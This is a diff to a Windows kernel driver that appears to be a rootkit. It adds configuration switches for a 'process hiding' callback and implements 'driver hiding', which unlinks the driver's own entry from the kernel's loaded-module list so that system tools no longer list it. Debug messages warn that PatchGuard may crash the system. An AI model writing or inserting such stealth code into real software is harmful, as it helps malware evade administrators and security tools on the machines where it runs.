@@ -25,7 +25,10 @@ NTSTATUS UnloadDriver(PDRIVER_OBJECT pDriverObject)
 	IoDeleteDevice(pDriverObject->DeviceObject);
 
 	// Delete the processnotify routine
-	PsSetCreateProcessNotifyRoutineEx(ProcessNotifyCallbackEx, TRUE);
+	if (EnableProcessNotifyCallbackEx) 
+	{
+		PsSetCreateProcessNotifyRoutineEx(ProcessNotifyCallbackEx, TRUE);
+	}
 	return STATUS_SUCCESS;
 }
 
@@ -74,8 +77,30 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject,
 	pDeviceObject->Flags |= DO_DIRECT_IO;
 	pDeviceObject->Flags &= ~DO_DEVICE_INITIALIZING;
 
-	// set up createprocess routine
-	PsSetCreateProcessNotifyRoutineEx(ProcessNotifyCallbackEx, FALSE);
+	// Set up the CreateProcess routine. Change in data.h to enable.
+	if (EnableProcessNotifyCallbackEx == 1) 
+	{
+		DbgPrintEx(0, 0, "Process hiding feature is enabled.\n");
+		DbgPrintEx(0, 0, "You may get BSOD if you have the Windows PatchGuard running. (Very frequently.)\n");
+		PsSetCreateProcessNotifyRoutineEx(ProcessNotifyCallbackEx, FALSE);
+	}
+
+	// Change in data.h to enable.
+	if (EnableDriverHiding == 1)
+	{
+		PLDR_DATA_TABLE_ENTRY CurDriverEntry = (PLDR_DATA_TABLE_ENTRY)pDriverObject->DriverSection;
+		PLDR_DATA_TABLE_ENTRY NextDriverEntry = (PLDR_DATA_TABLE_ENTRY)CurDriverEntry->InLoadOrderLinks.Flink;
+		PLDR_DATA_TABLE_ENTRY PrevDriverEntry = (PLDR_DATA_TABLE_ENTRY)CurDriverEntry->InLoadOrderLinks.Blink;
+
+		PrevDriverEntry->InLoadOrderLinks.Flink = CurDriverEntry->InLoadOrderLinks.Flink;
+		NextDriverEntry->InLoadOrderLinks.Blink = CurDriverEntry->InLoadOrderLinks.Blink;
+
+		CurDriverEntry->InLoadOrderLinks.Flink = (PLIST_ENTRY)CurDriverEntry;
+		CurDriverEntry->InLoadOrderLinks.Blink = (PLIST_ENTRY)CurDriverEntry;
+
+		DbgPrintEx(0, 0, "Driver hiding feature is enabled.\n");
+		DbgPrintEx(0, 0, "You may get BSOD if you have the Windows PatchGuard running. (10-30mins)\n");
+	}
 
 	return STATUS_SUCCESS;
 }
